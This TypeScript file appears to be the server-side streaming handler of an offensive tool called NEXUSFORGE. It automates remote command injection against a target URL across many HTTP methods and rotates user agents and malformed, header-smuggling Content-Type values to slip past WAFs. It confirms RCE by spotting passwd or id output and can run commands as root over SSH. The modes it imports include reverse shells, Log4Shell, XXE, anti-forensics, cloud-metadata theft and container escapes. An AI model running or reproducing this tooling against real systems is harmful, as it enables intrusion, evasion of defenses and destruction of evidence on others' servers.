import type { WebSocket } from "ws";
import { sshStreamExec, type SshOptions } from "../lib/sshExec.js";
import { extractCommandOutput } from "../lib/outputExtractor.js";
import {
  applyQuantumBypass,
  buildPayloadVariants,
  buildPolymorphicPayload,
  buildHttpBypassHeaders,
  buildWafSpecificHeaders,
  buildSSTIPayloads,
  buildLog4ShellPayloads,
  buildXXEPayloads,
  buildStealthPayloads,
  buildTimingPayloads,
  buildWindowsPayloads,
  buildWindowsTimingPayloads,
  buildWindowsReverseShells,
  buildAntiForensicsPayloads,
  buildReverseShells,
  buildCloudMetaPayloads,
  buildContainerEscapes,
  buildContextPayloads,
  buildAdaptivePayloads,
  isSelfTarget,
} from "../lib/bypassEngine.js";
import { probeTargetEnvironment } from "../lib/targetProbe.js";
import { logInjection }  from "../lib/injectionLogger.js";
import { logger }        from "../lib/logger.js";
import { StreamExecRequestSchema } from "../lib/schemas.js";

interface ExecRequest {
  cmd:            string;
  engine?:        string;
  mode?:          string;
  injectionUrl?:  string;
  injectParam?:   string;
  httpMethod?:    string;
  customHeaders?: string;
  attackerIp?:    string;
  attackerPort?:  string;
  sshHost?:       string;
  sshPort?:       number;
  sshUser?:       string;
  sshPassword?:   string;
  sshKey?:        string;
}

function send(ws: WebSocket, obj: unknown): void {
  if (ws.readyState === 1) {
    try { ws.send(JSON.stringify(obj)); } catch { /* connection closed mid-send */ }
  }
}

const UA_POOL = [
  "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
  "curl/8.7.1",
  "curl/8.10.1",
  "python-requests/2.32.3",
  "Wget/1.21.4",
  "Go-http-client/2.0",
  "Apache-HttpClient/4.5.14",
  "okhttp/4.12.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36 Edg/131.0.2903.86",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
  "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.104 Mobile Safari/537.36",
  "AmazonCloudFront",
  "Googlebot-News",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36 Edg/136.0.3240.50",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.99 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
  "python-requests/2.32.3",
  "axios/1.8.4",
  "node-fetch/3.3.2",
  "curl/8.12.1",
  "libwww-perl/6.80",
  "Go-http-client/2.0",
  "Java/22.0.2",
];

const CONTENT_TYPE_VARIANTS = [
  "application/x-www-form-urlencoded",
  "application/x-www-form-urlencoded; charset=UTF-8",
  "application/x-www-form-urlencoded;charset=utf-8",
  "application/x-www-form-urlencoded ; charset=UTF-8",
  "application/x-url-encoded",
  "application/x-www-form-urlencoded\r\nX-Injected: a",
  "application/x-www-form-urlencoded\t",
  "application/x-www-form-urlencoded; charset=utf-8",
  "application/x-www-form-urlencoded%00",
  "multipart/form-data; boundary=----FormBoundary7MA4YWxkTrZu0gW",
  "application/json",
  "application/json; charset=UTF-8",
  "text/xml; charset=utf-8",
  "application/x-www-form-urlencoded\x00",
];

function detectWaf(status: number, body: string): string | null {
  const b = body.toLowerCase();
  if (status === 406 || b.includes("not acceptable")) return "ModSecurity/406";
  if (status === 403) {
    if (b.includes("cloudflare")) return "Cloudflare";
    if (b.includes("akamai") || b.includes("reference #")) return "Akamai";
    if (b.includes("incapsula") || b.includes("imperva")) return "Imperva/Incapsula";
    if (b.includes("aws waf") || b.includes("awswaf")) return "AWS WAF";
    if (b.includes("f5") || b.includes("big-ip")) return "F5 ASM";
    if (b.includes("barracuda")) return "Barracuda";
    if (b.includes("sucuri")) return "Sucuri";
    if (b.includes("blocked") || b.includes("forbidden")) return "Generic WAF";
  }
  if (status === 429) return "Rate-limit/WAF";
  if (b.includes("security event") || b.includes("access denied")) return "WAF";
  return null;
}

/**
 * Returns true only when the response body contains definitive command output
 * signatures. These are anchored, specific patterns that cannot match ordinary
 * HTML page content. All patterns are tested against the raw body so HTML
 * escaping cannot smuggle them past.
 */
function detectCommandOutput(body: string): boolean {
  /* ── Linux / Unix ── */
  const linuxHit =
    /uid=\d+\(\w+\)\s+gid=\d+\(\w+\)/.test(body)                         ||
    /root:x:0:0:/.test(body)                                               ||
    /^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]+$/m.test(body) ||
    /Linux \S+ \d+\.\d+\.\d+-\S+ #\d+ /.test(body)                       ||
    (/total \d+\n/.test(body) && /^[-drwxlst]{10}\s+\d+\s+\w+/m.test(body)) ||
    /^PATH=\/(?:usr\/(?:local\/)?)?(?:bin|sbin):/m.test(body)             ||
    /^HOME=\/(?:root|home\/\w+)$/m.test(body)                             ||
    /^LOGNAME=\w{1,32}$/m.test(body)                                      ||
    /^SHELL=\/(?:bin|usr\/bin)\//m.test(body)                             ||
    /^USER=\w{1,32}$/m.test(body)                                          ||
    /\/usr\/bin\/(?:perl|python3?|ruby|node|php)\b/.test(body)            ||
    /CPU\(s\):\s+\d+\s*$/.test(body);

  /* ── Windows ── */
  const winHit =
    /Microsoft Windows \[Version \d+\.\d+\.\d+\.\d+\]/.test(body)         ||
    /\bNT AUTHORITY\\(?:SYSTEM|LOCAL SERVICE|NETWORK SERVICE)\b/.test(body) ||
    /\bVolume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}/i.test(body)       ||
    /\bDirectory of [A-Za-z]:\\/i.test(body)                              ||
    /\bOS Name:\s+Microsoft Windows/i.test(body)                          ||
    /^C:\\[^\n]+>$/m.test(body)                                            ||
    /^COMPUTERNAME=[A-Z0-9_-]+$/m.test(body)                              ||
    /^USERPROFILE=C:\\Users\\/m.test(body)                                 ||
    /\bPS [A-Za-z]:\\[^\n]+> $/.test(body)                                ||
    /\bSystemRoot=C:\\Windows\b/.test(body);

  return linuxHit || winHit;
}

/**
 * True if the body is a standard HTML page with no embedded command output.
 * Used as a fast early-exit to suppress noisy HTML dumps.
 */
function isPlainHtmlResponse(body: string): boolean {
  const trimmed = body.trimStart();
  const looksHtml =
    /^<!DOCTYPE\s+html/i.test(trimmed) ||
    /^<html[\s>]/i.test(trimmed)       ||
    (/^<head[\s>]/i.test(trimmed) && body.includes("</head>"));
  if (!looksHtml) return false;
  // If RCE patterns are present inside the HTML the response is NOT plain
  return !detectCommandOutput(body);
}

interface AttemptResult {
  blocked:          boolean;
  confirmed:        boolean;   // true = RCE confirmed, stop scanning
  responseLen:      number;
  elapsed:          number;
  timedOut:         boolean;
}

async function fetchAttempt(
  ws:           WebSocket,
  injectionUrl: string,
  injectParam:  string,
  httpMethod:   string,
  headers:      Record<string, string>,
  payload:      string,
  attemptNum:   number,
  label:        string,
  baselineLen:  number,
  baselineBody: string,
): Promise<AttemptResult> {
  const t0 = Date.now();
  const NONE: AttemptResult = { blocked: false, confirmed: false, responseLen: 0, elapsed: 0, timedOut: false };
  try {
    const parsedUrl = new URL(injectionUrl);
    const method    = httpMethod.toUpperCase();

    send(ws, { type: "data", chunk: `\n[${label}]\n` });
    send(ws, { type: "data", chunk: `  ${method} ${parsedUrl.origin}${parsedUrl.pathname} param=${injectParam}\n` });
    send(ws, { type: "data", chunk: `  payload: ${payload.slice(0, 120)}${payload.length > 120 ? "…" : ""}\n` });

    let response: Response;
    const h = { ...headers };

    if (method === "GET" || method === "DELETE") {
      parsedUrl.searchParams.set(injectParam, payload);
      response = await fetch(parsedUrl.toString(), { method, headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "POST" || method === "PUT" || method === "PATCH") {
      h["Content-Type"] = CONTENT_TYPE_VARIANTS[attemptNum % CONTENT_TYPE_VARIANTS.length]!;
      const body = new URLSearchParams({ [injectParam]: payload }).toString();
      response = await fetch(parsedUrl.toString(), { method, headers: h, body, signal: AbortSignal.timeout(30000) });
    } else if (method === "JSON") {
      h["Content-Type"] = "application/json";
      response = await fetch(parsedUrl.toString(), { method: "POST", headers: h,
        body: JSON.stringify({ [injectParam]: payload }), signal: AbortSignal.timeout(30000) });
    } else if (method === "MULTIPART") {
      const fd = new FormData();
      fd.append(injectParam, payload);
      response = await fetch(parsedUrl.toString(), { method: "POST",
        headers: { "User-Agent": h["User-Agent"] ?? "" }, body: fd, signal: AbortSignal.timeout(30000) });
    } else if (method === "COOKIE") {
      h["Cookie"] = `${injectParam}=${encodeURIComponent(payload)}`;
      response = await fetch(parsedUrl.toString(), { method: "GET", headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "HEADER") {
      h[injectParam] = payload;
      response = await fetch(parsedUrl.toString(), { method: "GET", headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "PATH") {
      const pathUrl = new URL(injectionUrl);
      pathUrl.pathname = pathUrl.pathname.replace(/\/+$/, "") + "/" + encodeURIComponent(payload);
      response = await fetch(pathUrl.toString(), { method: "GET", headers: h, signal: AbortSignal.timeout(30000) });
    } else if (method === "XML") {
      h["Content-Type"] = "application/xml";
      const xmlBody = `<?xml version="1.0"?><root><${injectParam}>${payload.replace(/&/g, "&amp;").replace(/</g, "&lt;")}</${injectParam}></root>`;
      response = await fetch(parsedUrl.toString(), { method: "POST", headers: h, body: xmlBody, signal: AbortSignal.timeout(30000) });
    } else {
      send(ws, { type: "error", message: `Unsupported method: ${method}` });
      return { ...NONE };
    }

    const text    = await response.text();
    const rLen    = text.length;
    const waf     = detectWaf(response.status, text);
    const hasRce  = detectCommandOutput(text);
    const elapsed = Date.now() - t0;

    // Status line + relevant headers (Content-Type, Content-Length, Server)
    const usefulHeaders = ["content-type","content-length","server","x-powered-by","x-frame-options"];
    const hdrLines = Array.from(response.headers.entries())
      .filter(([k]) => usefulHeaders.includes(k.toLowerCase()))
      .map(([k, v]) => `  ${k}: ${v}`)
      .join("\n");
    send(ws, { type: "data", chunk: `  HTTP ${response.status} ${response.statusText}  [${rLen}b]\n${hdrLines}\n` });

    // ── Length-difference annotation (informational only, no "SIGNIFICANT" label) ──
    if (baselineLen > 0) {
      const diff    = rLen - baselineLen;
      const absDiff = Math.abs(diff);
      // Only annotate if change is substantial relative to baseline (>15% AND >300 bytes)
      // to filter out dynamic content variation (ads, tokens, timestamps)
      const pct = Math.round((absDiff / baselineLen) * 100);
      if (absDiff > 300 && pct > 15) {
        const direction = diff > 0 ? "+" : "";
        send(ws, { type: "data", chunk: `  Δ ${direction}${diff}b vs baseline ${baselineLen}b (${direction}${pct}%)\n` });
      }
    }

    send(ws, { type: "data", chunk: `  ${elapsed}ms\n` });

    // ── RCE confirmed ──────────────────────────────────────────────────────────
    if (hasRce) {
      // False-positive guard: baseline must NOT already contain RCE signatures
      const baselineAlsoMatched = baselineBody.length > 100 && detectCommandOutput(baselineBody);
      const lenDiff = baselineLen > 0 ? Math.abs(rLen - baselineLen) : 999;

      if (baselineAlsoMatched && lenDiff < 200) {
        send(ws, { type: "data", chunk:
          `\n  ⚠ [FP-GUARD] Baseline response also contains cmd-output patterns (Δ${lenDiff}b)\n` +
          `  Possible false positive — try OOB/timing mode to confirm\n`
        });
      } else {
        const lenNote = baselineLen > 0 ? `Δlen:${rLen - baselineLen}b vs baseline` : "no baseline";
        send(ws, { type: "data", chunk: `\n✔ EXECUTION CONFIRMED — command output detected (${lenNote})\n` });

        // Extract and surface structured output
        const extracted = extractCommandOutput(text, baselineBody.length > 50 ? baselineBody : undefined);
        if (extracted) {
          send(ws, {
            type:       "commandOutput",
            output:     extracted.text,
            method:     extracted.method,
            confidence: extracted.confidence,
          });
          send(ws, { type: "data", chunk:
            `[EXTRACTED] method=${extracted.method} confidence=${extracted.confidence}\n` +
            `────────────────────────────────────────\n` +
            `${extracted.text.slice(0, 3000)}\n` +
            `────────────────────────────────────────\n`
          });
        } else {
          // extractCommandOutput missed it — show raw body trimmed of HTML boilerplate
          const rawDump = text.slice(0, 2000);
          send(ws, { type: "data", chunk: `[RAW OUTPUT]\n${rawDump}\n` });
        }
        return { blocked: false, confirmed: true, responseLen: rLen, elapsed, timedOut: false };
      }
    }

    // ── No RCE confirmed: do NOT dump raw HTML responses ──────────────────────
    // Only show body if it's short AND plaintext (likely an error, API response, or echo)
    const contentType = response.headers.get("content-type") ?? "";
    const isHtml      = isPlainHtmlResponse(text) || contentType.includes("text/html");
    if (!isHtml) {
      // Non-HTML response (JSON, plain-text, XML error, etc.) — show it
      const preview = text.slice(0, 600);
      send(ws, { type: "data", chunk: `  [RESP] ${preview}${text.length > 600 ? `\n  … (${rLen}b total)` : ""}\n` });
    } else if (rLen < 400) {
      // Very short HTML (probably an error page) — worth showing
      send(ws, { type: "data", chunk: `  [RESP] ${text.slice(0, 400)}\n` });
    }
    // Large plain HTML pages: suppress entirely — they contain no useful injection evidence

    if (waf) {
      send(ws, { type: "data", chunk: `\n  ✖ WAF: ${waf}\n` });
      return { blocked: true, confirmed: false, responseLen: rLen, elapsed, timedOut: false };
    }

    return { blocked: false, confirmed: false, responseLen: rLen, elapsed, timedOut: false };

  } catch (err: unknown) {
    const msg      = (err as Error).message ?? String(err);
    const elapsed  = Date.now() - t0;
    const timedOut = msg.includes("timed out") || msg.includes("TimeoutError") || msg.includes("AbortError");
    send(ws, { type: "data", chunk: `  [${timedOut ? "TIMEOUT" : "FETCH ERROR"}] ${msg}\n` });
    return { ...NONE, elapsed, timedOut };
  }
}

async function handleRemoteInject(
  ws:           WebSocket,
  injectionUrl: string,
  injectParam:  string,
  httpMethod:   string,
  customHeaders: string,
  processed:    string,
  start:        number,
  originalCmd:  string,
  engine:       string,
  mode:         string,
  attackerIp:   string,
  attackerPort: string,
): Promise<void> {
  if (isSelfTarget(injectionUrl)) {
    send(ws, { type: "error", message: "Self-targeting is disabled — configure an external target URL." });
    ws.close();
    return;
  }

  let parsedUrl: URL;
  try { parsedUrl = new URL(injectionUrl); } catch {
    send(ws, { type: "error", message: `Invalid injection URL: ${injectionUrl}` });
    ws.close();
    return;
  }

  send(ws, { type: "data", chunk:
    `[NEXUSFORGE] Remote Injection\n` +
    `[TARGET]    ${parsedUrl.toString()}\n` +
    `[METHOD]    ${httpMethod}\n` +
    `[PARAM]     ${injectParam}\n` +
    `[MODE]      ${mode.toUpperCase()}\n` +
    `─────────────────────────────────────────\n`
  });

  send(ws, { type: "data", chunk: `\n[PROBE] Fingerprinting ${parsedUrl.hostname}...\n` });
  const env = await probeTargetEnvironment(injectionUrl, 8000).catch(() => null);
  if (env?.reachable) {
    send(ws, { type: "data", chunk:
      `[ENV] Server   : ${env.server    || "unknown"}\n` +
      `[ENV] Language : ${env.language  || "unknown"}\n` +
      `[ENV] Framework: ${env.framework || "unknown"}\n` +
      (env.cms ? `[ENV] CMS      : ${env.cms}\n` : "") +
      `[ENV] WAF      : ${env.waf ? `${env.waf} [confidence: ${env.wafConfidence}]` : "none detected"}\n` +
      `[ENV] Response : HTTP ${env.statusCode} (${env.responseTime}ms, ${env.bodyLength}b)\n`
    });
    for (const hint of env.injectHints.slice(0, 4)) {
      send(ws, { type: "data", chunk: `[HINT] ${hint}\n` });
    }
  } else {
    send(ws, { type: "data", chunk: "[WARN] Target probe failed — proceeding with injection\n" });
  }
  send(ws, { type: "data", chunk: "\n" });

  const preBuiltCookie = (() => {
    if (!customHeaders.trim()) return "";
    for (const line of customHeaders.split(/\r?\n/)) {
      if (/^cookie\s*:/i.test(line)) return line.replace(/^cookie\s*:\s*/i, "").trim();
    }
    return "";
  })();

  let baselineLen  = -1;
  let baselineMs   = 0;
  let baselineBody = "";
  try {
    send(ws, { type: "data", chunk: "[BASELINE] Measuring clean response...\n" });
    const bUrl = new URL(injectionUrl);
    if (httpMethod === "GET") bUrl.searchParams.set(injectParam, "nexus_baseline_probe");
    bUrl.searchParams.set("_nx", Math.random().toString(36).slice(2, 10));
    const bHdrs: Record<string, string> = {
      "User-Agent":      UA_POOL[0]!,
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control":   "no-cache",
      "Pragma":          "no-cache",
    };
    if (preBuiltCookie) bHdrs["Cookie"] = preBuiltCookie;
    const bT0   = Date.now();
    const bRes  = await fetch(bUrl.toString(), {
      method:  "GET",
      headers: bHdrs,
      signal:  AbortSignal.timeout(10000),
    });
    const bText  = await bRes.text();
    baselineLen  = bText.length;
    baselineBody = bText;
    baselineMs   = Date.now() - bT0;
    const bWarn  = detectCommandOutput(bText)
      ? " ⚠ baseline contains cmd-output signatures — FP-guard active"
      : "";
    send(ws, { type: "data", chunk: `[BASELINE] HTTP ${bRes.status} — ${baselineLen}b — ${baselineMs}ms${bWarn}\n\n` });
  } catch {
    send(ws, { type: "data", chunk: "[BASELINE] Could not measure — skipping diff analysis\n\n" });
  }

  let payloadVariants: string[];
  if (mode === "ssti") {
    payloadVariants = buildSSTIPayloads(originalCmd);
  } else if (mode === "log4shell") {
    payloadVariants = buildLog4ShellPayloads(attackerIp, attackerPort);
  } else if (mode === "xxe") {
    payloadVariants = buildXXEPayloads(attackerIp, attackerPort);
  } else if (mode === "timing" || mode === "blind") {
    payloadVariants = buildTimingPayloads(7);
  } else if (mode === "stealth") {
    payloadVariants = buildStealthPayloads(originalCmd);
  } else if (mode === "windows") {
    payloadVariants = buildWindowsPayloads(originalCmd);
  } else if (mode === "windows_timing") {
    payloadVariants = buildWindowsTimingPayloads(7);
  } else if (mode === "windows_rev") {
    payloadVariants = buildWindowsReverseShells(attackerIp, attackerPort);
  } else if (mode === "antiforensics") {
    payloadVariants = buildAntiForensicsPayloads(originalCmd);
  } else if (mode === "rev_shell") {
    payloadVariants = buildReverseShells(attackerIp, attackerPort);
  } else if (mode === "cloud") {
    payloadVariants = buildCloudMetaPayloads(originalCmd);
  } else if (mode === "container") {
    payloadVariants = buildContainerEscapes(originalCmd);
  } else if (mode === "polymorphic") {
    payloadVariants = Array.from({ length: 30 }, () => buildPolymorphicPayload(originalCmd, "quantum"));
  } else {
    payloadVariants = buildPayloadVariants(processed);
  }

  const detectedWaf      = env?.waf ?? null;
  const bypassHeaderSets = detectedWaf
    ? buildWafSpecificHeaders(detectedWaf)
    : buildHttpBypassHeaders();
  const MAX_ATTEMPTS     = Math.min(payloadVariants.length, 60);
  let consecutiveBlocks  = 0;
  let consecutiveTimeouts = 0;

  if (detectedWaf) {
    send(ws, { type: "data", chunk: `[STRATEGY] WAF "${detectedWaf}" detected — using targeted bypass header sets\n` });
  }
  send(ws, { type: "data", chunk: `[INJECT] Starting ${MAX_ATTEMPTS} attempts across ${bypassHeaderSets.length} WAF bypass header sets\n` });

  for (let i = 0; i < MAX_ATTEMPTS; i++) {
    if (ws.readyState !== 1) break;

    const payload    = payloadVariants[i]!;
    const bypassHdrs = bypassHeaderSets[i % bypassHeaderSets.length]!;
    const ua         = UA_POOL[i % UA_POOL.length]!;

    const headers: Record<string, string> = {
      "User-Agent":      ua,
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
      "Connection":      "keep-alive",
      "Cache-Control":   "no-cache",
      ...bypassHdrs,
    };

    if (customHeaders.trim()) {
      for (const line of customHeaders.split(/\r?\n/)) {
        const sep = line.indexOf(":");
        if (sep > 0) headers[line.slice(0, sep).trim()] = line.slice(sep + 1).trim();
      }
    }

    const bypassTag = i === 0 ? "direct" : `bypass-${i}`;
    const label     = `${i + 1}/${MAX_ATTEMPTS} [${bypassTag}]`;
    const result    = await fetchAttempt(
      ws, injectionUrl, injectParam, httpMethod, headers, payload,
      i, label, baselineLen, baselineBody,
    );

    // ── Timing oracle: escalate on slow responses ──────────────────────────
    if (result.elapsed > 5500 && baselineMs < 1500) {
      const ratio = baselineMs > 0 ? (result.elapsed / baselineMs).toFixed(1) : "∞";
      send(ws, { type: "data", chunk:
        `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms, ratio: ${ratio}x) — POSSIBLE BLIND RCE\n` +
        `  Escalating timing variants for payload index ${i}\n`
      });
      payloadVariants.splice(i + 1, 0, ...buildTimingPayloads(10).slice(0, 5), ...buildTimingPayloads(5).slice(0, 5));
    } else if (result.elapsed > 3500 && baselineMs < 800) {
      send(ws, { type: "data", chunk: `\n  [TIMING] Mild delay: ${result.elapsed}ms vs baseline ${baselineMs}ms — monitoring\n` });
    }

    // ── RCE confirmed: stop immediately ───────────────────────────────────
    if (result.confirmed) {
      const elapsed = Date.now() - start;
      void logInjection(originalCmd, `remote/${httpMethod.toLowerCase()}`, mode, elapsed);
      send(ws, { type: "end", code: 0, elapsed });
      ws.close();
      return;
    }

    // ── WAF escalation ─────────────────────────────────────────────────────
    if (result.blocked) {
      consecutiveBlocks++;
      send(ws, { type: "data", chunk: `[ESCALATE] WAF blocked (${consecutiveBlocks}) — rotating variant ${i + 2}\n` });
      if (consecutiveBlocks === 5) {
        send(ws, { type: "data", chunk: `[STRATEGY] Injecting stealth + timing payloads into queue\n` });
        const extra = [
          ...buildTimingPayloads(7).slice(0, 6),
          ...buildStealthPayloads(originalCmd).slice(0, 6),
        ];
        payloadVariants.splice(i + 1, 0, ...extra);
      }
      if (consecutiveBlocks >= 10) {
        send(ws, { type: "data", chunk: `[ABORT] WAF is blocking all variants consistently — try OOB or DNS exfil mode\n` });
        break;
      }
    } else {
      consecutiveBlocks = 0;
    }

    // ── Timeout escalation ─────────────────────────────────────────────────
    if (result.timedOut) {
      consecutiveTimeouts++;
      if (consecutiveTimeouts >= 3) {
        send(ws, { type: "data", chunk: `[ABORT] 3 consecutive timeouts — target unresponsive\n` });
        break;
      }
    } else {
      consecutiveTimeouts = 0;
    }
  }

  // ── Exhausted all attempts without confirmed RCE ───────────────────────
  const elapsed = Date.now() - start;
  void logInjection(originalCmd, `remote/${httpMethod.toLowerCase()}`, mode, elapsed);
  send(ws, { type: "data", chunk: `\n[RESULT] No RCE confirmed after ${MAX_ATTEMPTS} attempts\n` });
  send(ws, { type: "data", chunk: `[NEXT] Suggestions:\n` +
    `  • Try OOB mode with your callback URL (blind exfil)\n` +
    `  • Try TIMING mode to detect blind delay oracles\n` +
    `  • Verify the injection parameter name is correct\n` +
    `  • Check if target uses a different HTTP method (POST/JSON/MULTIPART)\n`
  });
  send(ws, { type: "end", code: 1, elapsed });
  ws.close();
}

export function handleStreamExec(ws: WebSocket): void {
  let executing = false;

  ws.on("message", (raw) => {
    if (executing) {
      send(ws, { type: "data", chunk: "[WARN] Execution already in progress — ignoring duplicate message\n" });
      return;
    }

    let parsed: unknown;
    try { parsed = JSON.parse(String(raw)); } catch {
      send(ws, { type: "error", message: "Invalid JSON" });
      ws.close();
      return;
    }

    const parse = StreamExecRequestSchema.safeParse(parsed);
    if (!parse.success) {
      send(ws, { type: "error", message: "Invalid request: " + parse.error.message });
      ws.close();
      return;
    }

    const {
      cmd,
      engine        = "bash",
      mode          = "classic",
      injectionUrl,
      injectParam   = "cmd",
      httpMethod    = "GET",
      customHeaders = "",
      attackerIp    = "127.0.0.1",
      attackerPort  = "4444",
      sshHost,
      sshPort       = 22,
      sshUser       = "root",
      sshPassword,
      sshKey,
    } = parse.data;

    executing = true;
    const start     = Date.now();
    const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
    void runStreamExec(
      ws,
      { cmd, engine, mode, injectionUrl, injectParam, httpMethod, customHeaders,
        attackerIp, attackerPort, sshHost, sshPort, sshUser, sshPassword, sshKey, start, processed },
    ).finally(() => { executing = false; });
  });
}

async function runStreamExec(ws: WebSocket, args: {
  cmd: string; engine: string; mode: string; injectionUrl?: string; injectParam: string;
  httpMethod: string; customHeaders: string; attackerIp: string; attackerPort: string;
  sshHost?: string; sshPort: number; sshUser: string; sshPassword?: string; sshKey?: string;
  start: number; processed: string;
}): Promise<void> {
  const { cmd, engine, mode, injectionUrl, injectParam, httpMethod, customHeaders,
    attackerIp, attackerPort, sshHost, sshPort, sshUser, sshPassword, sshKey, start, processed } = args;

  send(ws, { type: "data", chunk: `root@${new URL(injectionUrl || "http://target").hostname}:~# ${cmd}\n` });

  if (sshHost?.trim()) {
    const opts: SshOptions = {
      host:       sshHost.trim(),
      port:       Number(sshPort) || 22,
      username:   (sshUser ?? "root").trim(),
      password:   sshPassword?.trim() || undefined,
      privateKey: sshKey?.trim()      || undefined,
      timeoutMs:  30_000,
    };
    send(ws, { type: "data", chunk: `[SSH] Connecting to ${opts.host}:${opts.port} as ${opts.username}...\n` });
    let accum = "";
    sshStreamExec(
      opts,
      processed,
      (chunk: string) => {
        accum += chunk;
        send(ws, { type: "data", chunk });
        // Surface confirmed RCE output as a structured event
        if (detectCommandOutput(accum)) {
          const extracted = extractCommandOutput(accum);
          if (extracted) {
            send(ws, {
              type:       "commandOutput",
              output:     extracted.text,
              method:     extracted.method,
              confidence: extracted.confidence,
            });
          }
        }
      },
      (code: number | null, elapsed: number) => {
        void logInjection(cmd, `ssh/${engine}`, mode, elapsed);
        send(ws, { type: "end", code: code ?? 0, elapsed });
        ws.close();
      },
      (err: Error) => {
        send(ws, { type: "data", chunk: `[SSH ERROR] ${err.message}\n` });
        send(ws, { type: "end", code: 1, elapsed: Date.now() - start });
        ws.close();
      },
    );
    return;
  }

  if (!injectionUrl?.trim()) {
    send(ws, { type: "error", message: "injectionUrl or sshHost required" });
    ws.close();
    return;
  }

  await handleRemoteInject(
    ws, injectionUrl, injectParam, httpMethod, customHeaders,
    processed, start, cmd, engine, mode, attackerIp, attackerPort,
  );
}
